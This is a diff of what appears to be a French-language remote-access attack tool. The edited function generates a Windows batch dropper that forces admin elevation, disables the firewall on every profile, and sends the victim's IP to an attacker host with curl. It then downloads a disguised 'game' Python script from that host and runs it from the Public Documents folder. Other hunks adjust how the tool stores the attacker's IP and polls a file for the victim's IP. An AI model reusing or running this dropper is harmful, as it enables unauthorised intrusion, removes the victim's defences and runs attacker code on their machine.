@@ -78,7 +78,7 @@ def generation_vecteur(host : str, output : str = "payload") -> None:
     """
     os.system(f"del {output}.bat")
     fich=open(f'{output}.bat','w')
-    msg=f"@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command \"Start-Process cmd -ArgumentList '/c \\\"%~fnx0\\\"' -Verb RunAs\"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\n(for /F \"tokens=16\" %%i in (\'\"ipconfig | findstr IPv4\"\') do (curl -d %%i http://{host}:8888/))\ncurl http://{host}:8000/payload/jeu.pyw -o jeu.py\npython jeu.py"
+    msg=f"@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command \"Start-Process cmd -ArgumentList '/c \\\"%~fnx0\\\"' -Verb RunAs\"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\n(for /F \"tokens=16\" %%i in (\'\"ipconfig | findstr IPv4\"\') do (curl -d %%i http://{host}:8888/))\ncurl http://{host}:8000/payload/jeu.pyw -o C:\\Users\\Public\\Documents\\jeu.py\npython C:\\Users\\Public\\Documents\\jeu.py"
     fich.write(msg)
     fich.close()
     Info.valide(f"Vecteur crée avec le nom : {output}.bat")
@@ -98,7 +98,7 @@ def save_ip(host) -> None:
     ## Sorties
     Aucune sortie
     """
-    fich=open('selfIp.txt','w')
+    fich=open('txt_files/selfIp.txt','w')
     fich.write(host)
     fich.close()
 
@@ -119,11 +119,13 @@ def read_victime_ip() -> str:
     ## Sorties
     victime_ip : str, adresse IP de la victime
     """
-    ip_buffer = ""
+    first_time = True
     ip_victime = None
     donnees=[]
-    while ip_buffer != ip_victime:
-        ip_buffer = ip_victime
+    while first_time:
+        first_time = donnees == []
+        print(first_time)
+        donnees=[]
         while donnees==[]:
             fich=open('txt_files/message.txt','r')
             contenue = csv.reader(fich,delimiter=';')
@@ -131,8 +133,8 @@ def read_victime_ip() -> str:
             for ligne in contenue:
                 donnees.append(ligne)
                 print(ligne)
-            fich.close()
-        ip_victime : str = donnees[0][0]
-        time.sleep(10)
+            fich.close() 
+        time.sleep(3)
+    ip_victime : str = donnees[0][0]
     Info.valide(f"IP de la victime trouvé : {ip_victime}")
     return ip_victime
